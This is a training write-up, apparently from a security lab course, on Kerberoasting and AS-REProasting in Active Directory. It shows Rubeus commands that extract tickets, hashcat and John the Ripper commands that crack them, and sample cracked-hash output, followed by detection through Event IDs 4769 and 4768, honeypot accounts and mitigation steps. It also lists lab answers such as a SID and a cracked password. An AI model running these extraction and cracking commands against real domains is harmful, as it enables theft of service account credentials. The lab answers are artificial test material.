# Kerberoasting and AS-REProasting  - Real attack, detection methods, and remediation
### **Kerberoasting Attack Overview**

#### **Description**
Kerberoasting is a post-exploitation technique in Active Directory environments that targets Service Principal Names (SPNs). SPNs associate a service instance with a service logon account, enabling Kerberos authentication without the need for explicit account names. During the Kerberos Ticket Granting Service (TGS) process, the ticket is encrypted with the service account's NTLM hash.

This attack exploits the ability to request service tickets, extract them, and attempt offline password cracking. The strength of the service account’s password and the encryption algorithm (AES, RC4, or DES) determine the attack's success. AES is slower to crack than RC4 or DES, but RC4 remains widely used in many environments.

#### **Key Features**
- **Target**: Service accounts with SPNs.
- **Tools**: Rubeus for ticket extraction, hashcat or John the Ripper for cracking.
- **Encryption Algorithms**:
  - **AES**: Most secure, slower to crack.
  - **RC4**: Commonly used, faster to crack.
  - **DES**: Legacy, rarely used.

---

### **Attack Path**

#### **Step 1: Extracting Service Tickets**
Using **Rubeus**, tickets for accounts with SPNs can be extracted. The following command gathers all eligible tickets and writes them to a file:

```powershell
.\Rubeus.exe kerberoast /outfile:spn.txt
```

#### **Sample Output**
```plaintext
[*] Total kerberoastable users: 3

[*] SamAccountName: Administrator
[*] ServicePrincipalName: http/pki1
[*] Supported ETypes: RC4_HMAC_DEFAULT
[*] Hash written to: spn.txt
```

---

#### **Step 2: Cracking Service Tickets**
Transfer the `spn.txt` file to a cracking environment (e.g., Kali Linux). Crack the hashes using **hashcat**:

```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

##### **Output Example**
```plaintext
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Recovered........: 1/1 (100.00%)
Candidate........: Slavi123
```

Alternatively, use **John the Ripper**:
```bash
john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

---

### **Captured TGS Hash Example**
```plaintext
$krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab67a0447d7d...:Slavi123
```

---
## Detection and Mitigation Techniques for TGS Requests and Kerberoasting

### Detection via Event Logs
- **Event ID 4769**: 
  - This event is generated whenever a TGS (Ticket Granting Service) is requested. It logs details about the request, including the user and service involved. 
  - Challenges:
    - High volume: Every service connection in Active Directory (AD) generates an Event ID 4769, making it difficult to isolate malicious activity.
  - Detection Strategy:
    - If an environment enforces **AES-only encryption** for tickets, alerting on Event ID 4769 with **RC4 ticket options** is a strong indicator of suspicious activity.
    - Alert on **unusually high ticket generation rates**:
      - Example: Tools like Rubeus generate multiple tickets (e.g., over 10 in a minute). Group the event logs by:
        - **User requesting tickets**.
        - **Originating machine**.
    - Example: In a controlled environment with only two users having SPNs, a suspicious spike in ticket requests can easily be identified and flagged.

---

### Using Honeypot Accounts
Honeypot accounts provide an effective method to detect malicious activity in an AD environment.

- **Characteristics of a Honeypot Account**:
  1. **Legacy Status**:
     - The account should appear as an older user with a plausible history of usage.
     - Preferably an **inactive account** (e.g., unused for 2+ years, ideally 5+ years).
  2. **Strong Password**:
     - The password should be complex enough to prevent cracking attempts, even if a ticket is obtained.
  3. **Privileges**:
     - Assign some level of privileges to make the account appear valuable (e.g., administrative roles or database access).
  4. **SPN Registration**:
     - Register a **Service Principal Name (SPN)**, such as for **IIS** or **SQL Server**, to mimic legitimate service accounts.

- **Detection Mechanisms**:
  - Alert on **any TGS request** for this honeypot account. Such requests are highly suspicious since the account should not have regular activity.
  - Monitor for:
    - **Successful and failed logins**.
    - Any changes to the account properties or permissions.

- **Implementation Example**:
  - Create a honeypot account, `svc-iam`, with the above criteria.
  - Configure monitoring tools to alert on activity involving this account.

---

### Example Events and Alerts
- **High Volume Ticket Requests**:
  - When using Rubeus or similar tools to perform Kerberoasting, AD generates multiple Event ID 4769 logs. For example:
    - User: `attacker`
    - Target: Multiple accounts with SPNs.
    - Alert: If over 10 tickets are requested within a minute from the same user or machine.

- **Honeypot Account Activity**:
  - Example honeypot account: `svc-iam`.
  - If a TGS request is detected for this account:
    - Immediate alert for investigation.

---

### **Mitigation Strategies**
1. **Use Strong Passwords**:
   - Implement strong, complex passwords for service accounts.
   - Enforce regular password changes.

2. **Limit SPN Exposure**:
   - Regularly audit SPNs to identify unnecessary or over-permissioned accounts.
   - Remove SPNs for unused or inactive accounts.

3. **Disable Legacy Protocols**:
   - Disable RC4 and DES encryption if not required by legacy applications.

4. **Monitor and Detect**:
   - Use SIEM tools to monitor abnormal TGS requests.
   - Track usage of tools like Rubeus in your environment.

5. **Implement Privileged Access Management (PAM)**:
   - Use PAM solutions to manage service account credentials securely.

---

Practice tasks:
Using the same method as before extract the has of SVC user and store hash. Transport hash and crack it. Redacted answer.

Using event viewer analyze logs with event ID 4769, enter SID of log related to webservice. Redacted answer.



### **AS-REProasting Attack Overview**

#### Key Updates from the Previous Content:
1. **Description Similarities:** The AS-REProasting attack parallels Kerberoasting but focuses on user accounts with *Do not require Kerberos preauthentication* enabled.
2. **New Details in Detection and Prevention:**
   - **Prevention Enhancements:** Suggested applying a **20-character password policy** specifically for accounts with this property, reducing crackable attempts.
   - **Detection Refinements:** 
     - Event ID **4768** from Active Directory can signal attempts, but analyzing **login patterns across VLANs** is recommended for refining detection.
   - **Honeypot Strategy:** Expanded with attributes of effective honeypots:
     - Assigned **privileges** to attract attackers.
     - Ensured realistic attributes like **password age** and **logins matching password changes**.

3. **Attack Execution:** 
   - Used `Rubeus.exe` to extract AS-REP hashes.
   - Required **manual modification** of the hash format for compatibility with Hashcat (added `$23$`).
   - Used **Hashcat** mode `-m 18200` for cracking.
   - Discovered **anni's password: `Slavi123`**.

4. **Playground Environment Tasks:**
   - Connected to **target `10.129.204.151`** with provided credentials.
   - Post-attack inspection of **DC1 logs (172.16.18.3)** revealed the **TargetSid for user `svc-iam`: `S-1-5-21-1518138621-4282902758-752445584-3103`.**

#### Simplified Recommendations:
- **Periodic Account Review:** Confirm necessity of the "preauthentication not required" flag and enforce stronger password policies.
- **Honeypot Best Practices:** Ensure believable attributes to entice attackers while retaining strong monitoring.
- **Advanced Logging Analysis:** Use VLAN-specific correlations to discern malicious behavior.
  
Practice tasks:
Using the same method as before extract the hash of SVC user and store hash. Transport hash and crack it. Redacted answer.

Using event viewer analyze logs with event ID 4769, enter SID of log related to SVC. 
Redacted answer.
